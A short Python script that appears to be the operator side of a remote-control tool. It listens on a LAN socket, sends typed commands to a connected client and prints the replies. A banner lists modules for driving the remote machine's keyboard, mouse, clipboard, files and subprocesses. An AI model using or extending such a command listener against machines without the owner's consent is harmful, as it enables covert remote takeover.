import socket

host = "192.168.1.75"
port = 6000

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    print("""Modules used to command:
    pyautogui
    keyboard
    pyperclip
    shutil
    os
    sys
    tkinter - messagebox
    subprocess
    """)
    s.bind((host, port))
    print("Listening on port {}".format(port))
    s.listen()
    conn, addr = s.accept()
    print("Connected to address {}".format(addr))
    with conn:
        conn.settimeout(1)
        try:
            while True:
                command = input("Command: ")
                while command == "":
                    command = input("Command: ")
                conn.send(command.encode())
                try:
                    returns = conn.recv(2048).decode('utf-8')
                    print(returns)

                    exceptions = conn.recv(2048).decode('utf-8')
                    print(exceptions)
                except TimeoutError:
                    pass
        except Exception as e:
            print("Socket Error:", e)
